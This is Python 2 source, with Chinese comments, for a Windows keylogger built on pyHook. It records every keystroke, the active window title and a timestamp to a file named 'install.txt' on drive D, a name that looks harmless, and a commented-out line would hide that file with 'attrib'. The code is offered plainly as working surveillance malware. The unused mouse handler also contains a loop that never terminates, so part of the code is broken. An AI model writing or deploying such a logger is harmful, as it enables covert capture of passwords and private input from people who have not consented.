# -*- coding: utf-8 -*- #
import pythoncom
import pyHook
import datetime
import os
oldname = ''
oldnamem = ''

def onMouseEvent(event):
    # 监听鼠标事件
    wrfile2 = open(r'd://install5.txt', 'a')
    evtname2 = event.WindowName
    global oldnamem
    while evtname2 != oldnamem:
        wrfile2.write( "---------\n")
        wrfile2.write( "MessageName:%s\n" % event.MessageName)
        #wrfile2.write( "Time:%s\n" % datetime.datetime.now())
        wrfile2.write( "WindowName:%s\n" % event.WindowName)
    #print "MessageName:", event.MessageName
    #   print "Message:", event.Message
    #print "Time:", datetime.datetime.now()
    #   print "Window:", event.Window
    #print "WindowName:", event.WindowName
    #   print "Position:", event.Position
    #   print "Wheel:", event.Wheel
    #print "Injected:", event.Injected
    print "---"
    # 返回 True 以便将事件传给其它处理程序
    # 注意，这儿如果返回 False ，则鼠标事件将被全部拦截
    # 也就是说你的鼠标看起来会僵在那儿，似乎失去响应了
    return True


def onKeyboardEvent(event):
    # 监听键盘事件
    timeNow = datetime.datetime.now()
    Now = timeNow.strftime('%H:%M:%S')
    #wrfile = os.popen('attrib \h d://test1.txt')
    wrfile = open(r'd://install.txt', 'a')
    evtname = event.WindowName
    global oldname
    while evtname != oldname:
        wrfile.write( "---------\n")
        wrfile.write( "WindowName:%s\n" % event.WindowName)
        wrfile.write( "Time:%s\n" % datetime.datetime.now())
        oldname = event.WindowName
    wrfile.write( "     Key:%s-%s  \n" % (event.Key, Now))
    #---code-debug-using---
    #evtname = event.WindowName
    #global oldname
    #while evtname != oldname:
    #    print "windowsName:",event.WindowName
    #    oldname = event.WindowName
    #print "Key:",event.Key
    #---                ---
    return True


def main():
    # 创建一个“钩子”管理对象
    hm = pyHook.HookManager()
    # 监听所有键盘事件
    hm.KeyDown = onKeyboardEvent
    # 设置键盘“钩子”
    hm.HookKeyboard()

    # 监听所有鼠标事件
    #hm.MouseLeftUp = onMouseEvent
    # 设置鼠标“钩子”
    #hm.HookMouse()

    # 进入循环，如不手动关闭，程序将一直处于监听状态
    pythoncom.PumpMessages()


if __name__ == "__main__":
    main()


